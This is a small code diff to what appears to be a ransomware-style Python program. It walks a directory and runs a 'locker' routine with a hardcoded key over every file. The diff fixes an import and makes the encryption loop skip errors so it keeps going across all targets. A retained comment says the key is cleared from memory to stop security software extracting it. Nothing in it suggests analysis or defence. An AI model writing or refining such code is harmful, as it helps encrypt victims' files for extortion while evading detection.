@@ -1,6 +1,6 @@
 import os
 import base64
-from Locker import locker
+from locker import locker
 from walker import walker
 
 
@@ -24,7 +24,10 @@ def main():
 
     targets = walker(path)
     for target in targets:
-        locker(target, hardcoded_key)
+        try:
+            locker(target, hardcoded_key)
+        except (FileNotFoundError, IsADirectoryError):
+            pass
     
     # Remove the hardcoded key from memory to
     # prevent any security apps to extract it.
